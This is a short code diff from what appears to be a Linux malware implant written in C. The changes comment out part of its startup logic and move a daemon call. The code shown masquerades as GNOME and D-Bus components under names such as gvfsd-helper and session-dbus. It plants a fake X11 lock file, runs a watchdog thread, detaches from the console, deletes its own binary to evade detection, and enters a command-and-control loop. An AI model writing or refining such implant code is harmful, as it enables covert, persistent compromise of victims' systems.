@@ -16,6 +16,7 @@ int main(int argc, char *argv[]) {
     printf("[+] DEBUG MODE ENABLED\n");
     #endif
 
+    /*
     pid_t id = getuid();
 
     // Spawn session-dbus (monitor)
@@ -54,19 +55,21 @@ int main(int argc, char *argv[]) {
 
         //daemon(0, 0);  // detach from current console
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
-        printf("initial spawn of gvfsd-helper\n");
+        //printf("initial spawn of gvfsd-helper\n");
 
         // creating .X11/X0-lock
         create_lock(0);
 
         // session-dbus create
         spawn_thread_watchdog(0);
+        daemon(0, 0);  // detach from current console
     }
 
     #ifndef DEBUG
     self_delete(argv[0]); //  deleting this binary.
     #endif
 
+    */
     // kick off c2 loop in main thread
     c2_loop();
     return 0;
